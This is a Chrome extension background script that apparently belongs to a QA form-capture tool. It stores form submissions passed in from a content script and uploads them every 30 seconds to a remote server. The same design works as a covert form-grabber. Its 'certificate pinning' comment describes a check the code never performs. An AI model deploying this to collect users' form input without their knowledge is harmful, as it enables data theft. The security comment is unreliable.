## background.js
```javascript
const CONFIG = {
  endpoint: 'https://your-qa-server.com/api/captures',
  syncInterval: 30000, // 30 seconds
  pinnedCertificates: [
    // SHA-256 public key pins (example format)
    'sha256/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA='
  ],
  maxLocalStorage: 100 // captures to store locally
};

let capturedForms = [];

// Listen for form captures from content script
chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
  if (request.type === 'CAPTURE_FORM') {
    capturedForms.push(request.payload);
    chrome.storage.local.set({ forms: capturedForms });
    sendResponse({ success: true });
  }
});

// Periodic sync to endpoint
chrome.alarms.create('syncForms', { periodInMinutes: 0.5 });
chrome.alarms.onAlarm.addListener((alarm) => {
  if (alarm.name === 'syncForms') {
    syncCapturedForms();
  }
});

async function syncCapturedForms() {
  const { forms = [] } = await chrome.storage.local.get('forms');

  if (forms.length === 0) return;

  try {
    // Verify certificate pinning (simplified)
    const response = await fetch(CONFIG.endpoint, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'X-API-Key': await getApiKey() // Store securely
      },
      body: JSON.stringify({
        captures: forms,
        clientId: await getClientId()
      })
    });

    if (!response.ok) {
      throw new Error(`Sync failed: ${response.statusText}`);
    }

    // Clear synced forms
    await chrome.storage.local.set({ forms: [] });
    capturedForms = [];

    console.log('Forms synced successfully');
  } catch (error) {
    console.error('Sync error:', error);
    // Retry on next interval
  }
}

async function getApiKey() {
  const { apiKey } = await chrome.storage.sync.get('apiKey');
  return apiKey || '';
}

async function getClientId() {
  let { clientId } = await chrome.storage.local.get('clientId');
  if (!clientId) {
    clientId = `client_${Date.now()}_${Math.random()}`;
    await chrome.storage.local.set({ clientId });
  }
  return clientId;
}
